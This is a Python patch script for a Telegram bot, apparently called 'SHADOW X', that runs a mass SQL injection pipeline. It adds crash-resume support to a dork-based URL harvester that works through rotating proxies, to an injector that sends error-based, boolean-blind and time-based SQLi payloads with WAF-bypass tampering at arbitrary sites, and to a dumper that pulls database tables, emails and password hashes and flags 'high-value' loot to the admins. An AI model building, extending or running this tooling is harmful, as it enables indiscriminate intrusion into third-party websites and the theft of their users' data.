import sys, py_compile
fn=sys.argv[1] if len(sys.argv)>1 else "new.py"
src=open(fn,"r",encoding="utf-8").read()
if "# RESUME-v2" in src:
    print("ALREADY PATCHED:",fn); sys.exit(0)
H1=r'''# ============ 💾 JOBS PERSIST + RESUME v2 ============
# RESUME-v2
JOBS_P=P("jobs_persist.json"); JOBS_DATA=P("jobs_data")
try: os.makedirs(JOBS_DATA,exist_ok=True)
except: pass
try: LAST_FILE
except NameError: LAST_FILE=P("last_cache.json")
try: AUTO_FILE
except NameError: AUTO_FILE=P("auto_persist.json")
def jp_load(): return load_json(JOBS_P,{})
def jp_save(d): save_json(JOBS_P,d)
def jp_reg(jid,kind,uid,cid,meta):
    d=jp_load(); d[jid]={"kind":kind,"uid":uid,"cid":cid,"meta":meta,"t":int(time.time())}; jp_save(d)
def jp_unreg(jid):
    d=jp_load(); d.pop(jid,None); jp_save(d)
    for ext in (".dorks",".state",".urls"):
        try: os.remove(os.path.join(JOBS_DATA,jid+ext))
        except: pass
def jp_pop(jid):
    d=jp_load(); e=d.pop(jid,None); jp_save(d); return e
TIME_PAY=[("' AND SLEEP(5)-- ","MySQL"),("' OR SLEEP(5)-- ","MySQL"),("' AND pg_sleep(5)-- ","PostgreSQL"),("'; WAITFOR DELAY '0:0:5'-- ","MSSQL"),("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ","Oracle")]
def tamper_comment(p): return p.replace(" ","/**/")
def tamper_urlenc(p): return p.replace("'","%27").replace(" ","%20")
TAMPERS=[tamper_comment,tamper_urlenc]
def _last_saver():
    prev=None; loaded=False
    while True:
        try:
            if not loaded:
                LAST.update(load_json(LAST_FILE,{})); loaded=True
            cur=json.dumps(LAST,sort_keys=True)
            if cur!=prev: save_json(LAST_FILE,LAST); prev=cur
        except: pass
        time.sleep(5)
def _auto_saver():
    t0=time.time()
    while True:
        try:
            if AUTO or time.time()-t0>20:
                save_json(AUTO_FILE,{str(u):{"done":v["done"],"limit":v["limit"]} for u,v in AUTO.items()})
        except: pass
        time.sleep(5)
threading.Thread(target=_last_saver,daemon=True).start()
threading.Thread(target=_auto_saver,daemon=True).start()
'''
src=src.replace("def turbo_parse(",H1+"def turbo_parse(",1)
T1=r'''def turbo_parse(cid,uid,mid,jid,dorks,engines,fresh,mode,threads=15,pages=1,workers=40):
    # RESUME-v2
    try:
        proxies=hprox(uid)
        try: save_json(os.path.join(JOBS_DATA,jid+".dorks"),dorks)
        except: pass
        stf=os.path.join(JOBS_DATA,jid+".state"); skip=0; seed=[]
        if os.path.exists(stf):
            try:
                js=load_json(stf,{}); skip=int(js.get("done",0)); seed=js.get("urls",[])
            except: pass
        results=list(seed); seen=set(seed); dorks=dorks[skip:]
        jp_reg(jid,"parse",uid,cid,{"threads":threads,"pages":pages,"workers":workers,"fresh":fresh,"engines":engines})
        estat={}; blocked=set(); reqs=[0]; done=[0]; last=[0.0]; t0=time.time(); cooldowns={}
        bump("parse"); bumpU(uid,"parse")
        if len(proxies)<sget("hunt_below",10):
            threading.Thread(target=turbo_hunt,args=(0,uid,0,0,150),kwargs={"silent":True},daemon=True).start()
        w=ew_get(); engines=sorted(engines,key=lambda e:-w.get(e,0))[:4]
        pgs=max(1,min(5,int(pages))); wks=max(10,min(150,int(workers)))
        cs=max(1,int(sget("admin_chunk_size",5000)))
        chunks=[dorks[i:i+cs] for i in range(0,len(dorks),cs)]; tc=len(chunks)
        async def run():
            conn=aiohttp.TCPConnector(limit=wks+10,ssl=False,ttl_dns_cache=300,enable_cleanup_closed=True)
            async with aiohttp.ClientSession(connector=conn,headers=HDR,timeout=aiohttp.ClientTimeout(total=5)) as s:
                sem=asyncio.Semaphore(threads); act=list(proxies); rc=[0]; alive=[True]
                async def pcheck():
                    if not act: return
                    sc=asyncio.Semaphore(50)
                    async def chk(p):
                        async with sc:
                            for ep in CHECK_EPS[:2]:
                                try:
                                    async with s.get(ep,proxy=p,ssl=False,timeout=aiohttp.ClientTimeout(total=4)) as r:
                                        if r.status==200 and re.search(r"\d{1,3}(\.\d{1,3}){3}",await r.text()): return p
                                except: continue
                            return None
                    al=[x for x in await asyncio.gather(*[chk(p) for p in act]) if x]
                    if al: act[:]=al
                async def editor():
                    ll=[0.0]
                    while alive[0]:
                        await asyncio.sleep(2)
                        now=time.time()
                        if now-ll[0]<2: continue
                        ll[0]=now
                        et=" ".join(f"{EMO.get(k,'•')}{v}" for k,v in sorted(estat.items(),key=lambda x:-x[1]) if v)
                        rps=round(reqs[0]/max(1,now-t0),1)
                        blk=", ".join(sorted(blocked)) if blocked else "—"
                        try: bot.edit_message_text(f"🌐 SHADOW PARSER ⚡{' ♻️' if skip else ''}\n{LINE}\n🛡️ {len(act)} | ⚡ {rps} r/s | 🧵 {threads} | 👷 {wks} | 📄 {pgs}\n{bar(done[0],len(dorks))} {pct(done[0],len(dorks))}% ({done[0]}/{len(dorks)})\n🔗 URLs: {len(results)} | ⛔ {blk}\n🏆 {et}",chat_id=cid,message_id=mid,reply_markup=stop_markup(jid))
                        except: pass
                async def task(d):
                    if stopped(jid): return []
                    rc[0]+=1; reqs[0]+=1
                    if rc[0]%30==0: await pcheck()
                    px=random.choice(act) if act else None
                    got=[]
                    async with sem:
                        for eng in engines:
                            if eng in blocked: continue
                            if cooldowns.get(eng,0)>time.time(): continue
                            for pg in range(pgs):
                                r,st=await a_eng(s,d,eng,pg,fresh,px)
                                if r is None:
                                    if st in (403,429,503): cooldowns[eng]=time.time()+20
                                    continue
                                estat[eng]=estat.get(eng,0)+len(r)
                                for u in r:
                                    if u not in seen: seen.add(u); got.append(u)
                                break
                            if got: break
                    return got
                ed=asyncio.ensure_future(editor())
                for ci,chunk in enumerate(chunks):
                    if stopped(jid): break
                    for fut in asyncio.as_completed([task(d) for d in chunk]):
                        if stopped(jid): break
                        results.extend(await fut)
                        done[0]+=1
                    if stopped(jid) or ci%10==9:
                        try: save_json(stf,{"done":skip+done[0],"urls":results[:100000]})
                        except: pass
                alive[0]=False
                try: ed.cancel()
                except: pass
        cf=asyncio.run_coroutine_threadsafe(run(),LOOP)
        while not cf.done():
            if stopped(jid):
                try: cf.result(timeout=10)
                except Exception:
                    try: cf.cancel()
                    except: pass
                break
            time.sleep(0.5)
        w2=ew_get()
        for k,v in estat.items():
            if v: w2[k]=w2.get(k,0)+1
        save_json(EW_FILE,w2)
        urls=uhq_filter(scope_filter(dns_filter(results)))
        clear_markup(cid,mid); jp_unreg(jid)
        blk=", ".join(sorted(blocked)) if blocked else "none"
        if urls:
            LAST.setdefault(uid,{})["parsed"]=urls
            tag="urls_partial.txt" if stopped(jid) else "urls.txt"
            send_doc(cid,("\n".join(urls)+"\n").encode(),tag,uid)
            mk=types.InlineKeyboardMarkup(); mk.add(sbtn("💉 ➡️ Injector","pipe:inject","success"))
            bot.send_message(cid,f"🌐 PARSER DONE {'⏹️ PARTIAL' if stopped(jid) else '🎉'}\n{LINE}\n🔗 {len(urls)} UHQ URLs!\n⛔ Blocked: {blk}",reply_markup=mk)
        else: bot.send_message(cid,f"😭 Koi URL nahi mila.\n⛔ Blocked: {blk}")
    except Exception as e:
        try: bot.send_message(cid,f"🐞 PARSE BUG:\n{type(e).__name__}: {e}")
        except: pass
'''
a=src.index("def turbo_parse("); b=src.index("ERROR_SIGS=[")
src=src[:a]+T1+src[b:]
I1=r'''ERROR_SIGS=["you have an error in your sql","right syntax to use","check the manual that corresponds","mysql_fetch_array","mysql_fetch_assoc","mysql_num_rows","mysqli_num_rows","warning: mysql_","warning: mysqli_","mariadb server","pg_query(","pg_exec(","postgresql query failed","sqlite3::query","sqlite_query(","ora-0","oracle error","pl/sql:","odbc sql server driver","microsoft jet database","jet database engine","unclosed quotation mark","unterminated string literal","quoted string not properly terminated","invalid input syntax for type","syntax error at or near","microsoft vb","vbscript runtime error","conversion failed when converting","supplied argument is not a valid","fatal error: uncaught pdoexception","db2 sql error","informix","division by zero"]
WAF_SIGS=["cloudflare","cf-ray","sucuri","wordfence","akamai","incapsula","imperva","attention required","access denied","blocked by","captcha verify","request unsuccessful"]
BIGDOM=["amazon","flipkart","google","youtube","facebook","instagram","twitter","wikipedia","apple","microsoft","etsy","ebay","walmart","target","aliexpress","alibaba","shopify","paypal","stripe","github"]
SCAN_V=3
def dbfam(sig,pay=""):
    if "CONVERT" in pay: return "MSSQL"
    if "CAST" in pay: return "PostgreSQL"
    s=sig.lower()
    if "postgres" in s or "pg_" in s or "invalid input syntax" in s or "pg_sleep" in s: return "PostgreSQL"
    if "ora" in s or "pl/sql" in s or "dbms_pipe" in s: return "Oracle"
    if "odbc" in s or "nvarchar" in s or "varchar value" in s or "microsoft" in s or "jet" in s or "db2" in s or "waitfor" in s: return "MSSQL/Access"
    if "sqlite" in s: return "SQLite"
    if "mariadb" in s: return "MariaDB"
    return "MySQL"
def build_url(parsed,nq): return urlunparse((parsed.scheme,parsed.netloc,parsed.path,"",urlencode(nq,doseq=True),""))
ERR_PAY=["'","\"","')","'-- ","\"-- ","')-- ","' AND extractvalue(1,concat(0x7e,version(),0x7e))-- ","' AND updatexml(1,concat(0x7e,version(),0x7e))-- ","' AND 1=CONVERT(int,(select @@version))-- ","' AND 1=CAST((select version()) AS INT)-- "]
async def a_scan(s,url,to,tb=False):
    # RESUME-v2 (tamper + time-blind)
    try:
        net=urlparse(url).netloc.lower()
        if any(b in net for b in BIGDOM): return None
        parsed=urlparse(url); query=parse_qs(parsed.query,keep_blank_values=True)
        if not query: return None
        params=list(query.keys())[:2]; base_c=None
        for pi,param in enumerate(params):
            orig=(query[param] or [""])[0]
            for val in ERR_PAY:
                for vv in [val]+[t(val) for t in TAMPERS]:
                    nq=query.copy(); nq[param]=[orig+vv]
                    t,st=await a_get_fb(s,build_url(parsed,nq),to=to)
                    if st in (403,429): continue
                    if not t: continue
                    low=t.lower()
                    m=re.search(r"~([a-z0-9._\- ]{3,60})~",low)
                    if m and re.search(r"\d",m.group(1)): return {"url":url,"param":param,"payload":vv,"sig":"error-echo:"+m.group(1),"conf":3,"db":dbfam("",vv)}
                    hit=None
                    for sig in ERROR_SIGS:
                        if sig in low: hit=sig; break
                    if hit:
                        if base_c is None:
                            bt,_=await a_get_fb(s,url,to=to); base_c=(bt or "").lower()
                        if hit not in base_c: return {"url":url,"param":param,"payload":vv,"sig":hit,"conf":3,"db":dbfam(hit,vv)}
                    break
            if pi==0 and orig:
                bt,_=await a_get_fb(s,url,to=to)
                if bt:
                    l0=len(bt)
                    nq1=query.copy(); nq1[param]=[orig+"' AND '1'='1"]
                    nq2=query.copy(); nq2[param]=[orig+"' AND '1'='2"]
                    t1,_=await a_get_fb(s,build_url(parsed,nq1),to=to)
                    t2,_=await a_get_fb(s,build_url(parsed,nq2),to=to)
                    t3,_=await a_get_fb(s,build_url(parsed,nq2),to=to)
                    if t1 and t2 and t3:
                        l1,l2,l3=len(t1),len(t2),len(t3)
                        if abs(l2-l3)<=max(10,int(l2*0.02)) and abs(l1-l2)>=max(150,int(l1*0.2)) and abs(l1-l0)<=max(60,int(l0*0.05)):
                            return {"url":url,"param":param,"payload":"boolean-based","sig":"boolean-stable","conf":2,"db":"blind"}
                if tb:
                    base_t=[]
                    for _ in range(2):
                        t0b=time.time(); await a_get_fb(s,url,to=to+6); base_t.append(time.time()-t0b)
                    avg=sum(base_t)/2
                    for tpay,tdb in TIME_PAY:
                        nq=query.copy(); nq[param]=[orig+tpay]
                        t0b=time.time(); t,_=await a_get_fb(s,build_url(parsed,nq),to=to+10); dt=time.time()-t0b
                        if t is not None and dt>avg+4:
                            return {"url":url,"param":param,"payload":tpay,"sig":"time-based","conf":2,"db":tdb}
        return None
    except: return None
def turbo_inject(cid,uid,mid,jid,urls,mode,threads=15):
    # RESUME-v2
    try:
        jp_reg(jid,"inject",uid,cid,{"threads":threads})
        try: save_json(os.path.join(JOBS_DATA,jid+".urls"),urls)
        except: pass
        vuln=[]; nonev=[]; done=[0]; last=[0.0]; details=[]; reqs=[0]; wafed=[0]; dbst={}; t0=time.time(); since_save=[0]
        bump("inject"); bumpU(uid,"inject")
        vc=load_json(VULN_CACHE,{}); now=time.time(); to_test=[]
        to=min(max(mode["timeout"],6),10)
        tb=mode.get("timeout",0)>=12
        for u in urls:
            e=vc.get(u)
            if e and e.get("sv")==SCAN_V and now-e.get("t",0)<7*86400:
                if e.get("v"): vuln.append({"url":u})
                else: nonev.append(u)
                done[0]+=1
            else: to_test.append(u)
        try: bot.edit_message_text(f"💉 XDUMP INJECTOR\n{LINE}\n🧊 {len(to_test)} fresh | 🧵 {threads} | ⏱️ {to}s{' | ⏰ time-blind' if tb else ''}\n🗄️ MySQL•MariaDB•PG•MSSQL•Oracle•SQLite",chat_id=cid,message_id=mid,reply_markup=stop_markup(jid))
        except: pass
        HSEM={}
        async def run():
            conn=aiohttp.TCPConnector(limit=threads+10,limit_per_host=20,ssl=False,ttl_dns_cache=300,enable_cleanup_closed=True)
            async with aiohttp.ClientSession(connector=conn,headers=HDR,timeout=aiohttp.ClientTimeout(total=to)) as s:
                sem=asyncio.Semaphore(threads)
                def hsem(h):
                    if h not in HSEM: HSEM[h]=asyncio.Semaphore(2)
                    return HSEM[h]
                async def task(u):
                    async with sem:
                        reqs[0]+=1
                        async with hsem(urlparse(u).netloc):
                            return await a_scan(s,u,to,tb)
                for i in range(0,len(to_test),INJ_BATCH):
                    if stopped(jid): break
                    batch=to_test[i:i+INJ_BATCH]
                    res=await asyncio.gather(*[task(u) for u in batch],return_exceptions=True)
                    for u,r in zip(batch,res):
                        if isinstance(r,dict) and r.get("waf"):
                            wafed[0]+=1; nonev.append(u); vc[u]={"v":0,"t":now,"sv":SCAN_V}
                        elif isinstance(r,dict) and r:
                            vuln.append(r); details.append(r); vc[u]={"v":1,"t":now,"sv":SCAN_V}
                            dbst[r.get("db","?")]=dbst.get(r.get("db","?"),0)+1
                        else: nonev.append(u); vc[u]={"v":0,"t":now,"sv":SCAN_V}
                    done[0]+=len(batch); since_save[0]+=len(batch)
                    if since_save[0]>=2000: save_json(VULN_CACHE,vc); since_save[0]=0
                    now2=time.time()
                    if now2-last[0]>2:
                        last[0]=now2
                        rps=round(reqs[0]/max(1,now2-t0),1)
                        dbs=" ".join(f"{k}:{v}" for k,v in sorted(dbst.items(),key=lambda x:-x[1]))
                        try: bot.edit_message_text(f"💉 XDUMP INJECTOR 💪\n{LINE}\n{bar(done[0],len(urls))} {pct(done[0],len(urls))}% ({done[0]}/{len(urls)})\n🩸 Vuln: {len(vuln)} | 🛡️ Safe: {len(nonev)} | 🧱 WAF: {wafed[0]}\n🗄️ {dbs or '—'}\n⚡ {rps} r/s | 🧵 {threads} | 🧊 batch {i//INJ_BATCH+1}",chat_id=cid,message_id=mid,reply_markup=stop_markup(jid))
                        except: pass
        _run_on_loop(run())
        if len(vc)>20000: vc=dict(sorted(vc.items(),key=lambda kv:-kv[1].get("t",0))[:10000])
        save_json(VULN_CACHE,vc); clear_markup(cid,mid); jp_unreg(jid)
        vurls=[v["url"] for v in vuln]
        if vurls: send_doc(cid,("\n".join(vurls)+"\n").encode(),"vulnerable_urls.txt",uid)
        if nonev: send_doc(cid,("\n".join(nonev)+"\n").encode(),"none_vulnerable_urls.txt",uid)
        if details:
            det="\n".join(f"URL: {d['url']}\nParam: {d['param']} | DB: {d.get('db','?')}\nPayload: {d['payload']}\nSig: {d['sig']} | Conf: {d.get('conf',2)}\n{'-'*40}" for d in details)
            send_doc(cid,(det+"\n").encode(),"vuln_details.txt",uid)
            send_doc(cid,html_report("Vulnerability Report",details).encode(),"report.html",uid)
        if vurls:
            LAST.setdefault(uid,{})["vuln"]=vurls
            dbs=" | ".join(f"{k}×{v}" for k,v in sorted(dbst.items(),key=lambda x:-x[1]))
            mk=types.InlineKeyboardMarkup(); mk.add(sbtn("🩸 ➡️ Dumper","pipe:data","danger"))
            bot.send_message(cid,f"💉 INJECTOR DONE {'⏹️ PARTIAL' if stopped(jid) else '🎉'}\n{LINE}\n🩸 {len(vuln)} | 🛡️ {len(nonev)} | 🧱 {wafed[0]}\n🗄️ {dbs or '—'}",reply_markup=mk)
        else: bot.send_message(cid,f"💉 INJECTOR DONE\n{LINE}\n🩸 0 | 🛡️ {len(nonev)} | 🧱 {wafed[0]}\n{done[0]}/{len(urls)} tested")
    except Exception as e:
        try: bot.send_message(cid,f"🐞 INJECT BUG:\n{type(e).__name__}: {e}")
        except: pass
'''
a=src.index("ERROR_SIGS=["); b=src.index("def turbo_hunt(")
src=src[:a]+I1+src[b:]
D1=r'''DUMP_CACHE=P("dump_cache.json")
def run_datadump(cid,uid,mid,jid,urls,ph_old,mode,juicy):
    # RESUME-v2
    try:
        jp_reg(jid,"dump",uid,cid,{"juicy":juicy})
        try: save_json(os.path.join(JOBS_DATA,jid+".urls"),urls)
        except: pass
        ph=PH(uprox(uid)); dumps=[]; done=[0]; last=[0.0]; cur=["-"]; cached=[0]
        bump("dump"); bumpU(uid,"dump")
        dc=load_json(DUMP_CACHE,{}); now=time.time(); to_dump=[]
        for u in urls:
            if dc.get(u) and now-dc[u]<7*86400: cached[0]+=1
            else: to_dump.append(u)
        def edit(force=False):
            now=time.time()
            if force or now-last[0]>3:
                last[0]=now
                try: bot.edit_message_text(f"🩸 XDUMP DUMPER\n{LINE}\n{bar(done[0],len(to_dump))} {pct(done[0],len(to_dump))}% ({done[0]}/{len(to_dump)})\n💾 {len(dumps)} | 🔐 {sum(len(d.get('creds',[])) for d in dumps)} | {cur[0]}",chat_id=cid,message_id=mid,reply_markup=stop_markup(jid))
                except: pass
        def on_done(f,u):
            cur[0]=urlparse(u).netloc[:25]
            r=f.result()
            if r and (r.get("tables") or r.get("info")): dumps.append(r)
            dc[u]=now
            done[0]+=1; edit()
        run_jobs(lambda u:dump_one_url(u,ph,mode,juicy,jid),to_dump,jid,min(DUMP_WORKERS,mode["workers"]),on_done)
        if len(dc)>20000: dc=dict(sorted(dc.items(),key=lambda kv:-kv[1])[:10000])
        save_json(DUMP_CACHE,dc)
        clear_markup(cid,mid); edit(True); jp_unreg(jid)
        juicy_found=[]
        for dmp in dumps:
            for tn in dmp["tables"]:
                if any(k in tn.lower() for k in JUICY): juicy_found.append(f"{urlparse(dmp['url']).netloc} → {tn}")
        em,ha=count_loot(dumps)
        if juicy_found or em:
            for a in admins():
                try: bot.send_message(a,f"🚨 HIGH-VALUE DUMP\n{LINE}\n👤 {uid}\n📧 {em} | 🔑 {ha}\n"+"\n".join(juicy_found[:10]))
                except: pass
        if dumps:
            send_doc(cid,build_zip(dumps),"data_dump.zip",uid)
            rows=[{"url":d["url"],"type":"DB-DUMP "+d.get("db","?"),"param":",".join(d["tables"].keys()),"sig":str(sum(len(t["rows"]) for t in d["tables"].values()))+" rows"} for d in dumps]
            send_doc(cid,html_report("Dump Report",rows).encode(),"dump_report.html",uid)
            bot.send_message(cid,f"🩸 DUMPER DONE\n{LINE}\n💾 {len(dumps)} sites | 📋 {sum(len(d['tables']) for d in dumps)} tables\n📧 {em} | 🔑 {ha} | ⚡ {cached[0]} cached")
        else: bot.send_message(cid,f"😭 Koi naya data nahi. ⚡ {cached[0]} cached skips.")
    except Exception as e:
        try: bot.send_message(cid,f"🐞 DUMP BUG:\n{type(e).__name__}: {e}")
        except: pass
'''
a=src.index("DUMP_CACHE=P("); b=src.index("# ============ DORK/KEYWORD GEN")
src=src[:a]+D1+src[b:]
A1=r'''def auto_loop(uid,cid,limit,start_done=0):
    # RESUME-v2
    AUTO[uid]={"stop":False,"done":int(start_done),"limit":min(limit,100)}
    bump("auto"); bumpU(uid,"auto")
'''
a=src.index("def auto_loop("); b=src.index("def sched_loop(")
src=src[:a]+A1+src[b:]
Z1='''if __name__=="__main__":
    print("🌑 SHADOW X — FINAL RESUME BUILD starting...")
    if "check_resources" in globals():
        try: check_resources()
        except: pass
    if "job_cleanup_loop" in globals():
        threading.Thread(target=job_cleanup_loop,daemon=True).start()
    threading.Thread(target=sched_loop,daemon=True).start()
    def _resume_all():
        time.sleep(15)
        ad=load_json(AUTO_FILE,{})
        for u,v in ad.items():
            try:
                if v.get("done",0)<v.get("limit",0):
                    bot.send_message(int(u),"🔄 Bot wapas online — AUTO pilot resume!")
                    threading.Thread(target=auto_loop,args=(int(u),int(u),v["limit"],v["done"])).start()
            except: pass
        for jid,e in list(jp_load().items()):
            try:
                uid=int(e["uid"]); cid=int(e["cid"]); kind=e["kind"]; meta=e.get("meta",{})
                mode=get_mode(uid)
                if kind=="parse":
                    dorks=load_json(os.path.join(JOBS_DATA,jid+".dorks"),[])
                    if not dorks: jp_unreg(jid); continue
                    bot.send_message(cid,"🔄 Crash-resume: PARSER (partial state ke saath)")
                    msg=bot.send_message(cid,"⏳ RESUMING...",reply_markup=stop_markup(jid))
                    threading.Thread(target=turbo_parse,args=(cid,uid,msg.message_id,jid,dorks,meta.get("engines",["ddg","bing"]),meta.get("fresh",""),mode,meta.get("threads",15),meta.get("pages",1),meta.get("workers",40))).start()
                elif kind=="inject":
                    urls=load_json(os.path.join(JOBS_DATA,jid+".urls"),[])
                    if not urls: jp_unreg(jid); continue
                    bot.send_message(cid,"🔄 Crash-resume: INJECTOR (tested URLs cache se skip)")
                    msg=bot.send_message(cid,"⏳ RESUMING...",reply_markup=stop_markup(jid))
                    threading.Thread(target=turbo_inject,args=(cid,uid,msg.message_id,jid,urls,mode,meta.get("threads",15))).start()
                elif kind=="dump":
                    urls=load_json(os.path.join(JOBS_DATA,jid+".urls"),[])
                    if not urls: jp_unreg(jid); continue
                    bot.send_message(cid,"🔄 Crash-resume: DUMPER (dumped sites cache se skip)")
                    msg=bot.send_message(cid,"⏳ RESUMING...",reply_markup=stop_markup(jid))
                    threading.Thread(target=run_datadump,args=(cid,uid,msg.message_id,jid,urls,None,mode,meta.get("juicy",False))).start()
            except: pass
    threading.Thread(target=_resume_all,daemon=True).start()
    while True:
        try: bot.infinity_polling(timeout=30)
        except KeyboardInterrupt: print("🛑 Stopped."); break
        except Exception as e: print("⚠️ Restart:",e); time.sleep(5)
'''
a=src.index('if __name__=="__main__":')
src=src[:a]+Z1
open(fn,"w",encoding="utf-8").write(src)
try:
    py_compile.compile(fn,doraise=True)
    print("FINAL PATCH DONE - SYNTAX 100% OK:",fn)
except Exception as e:
    print("STILL:",e)
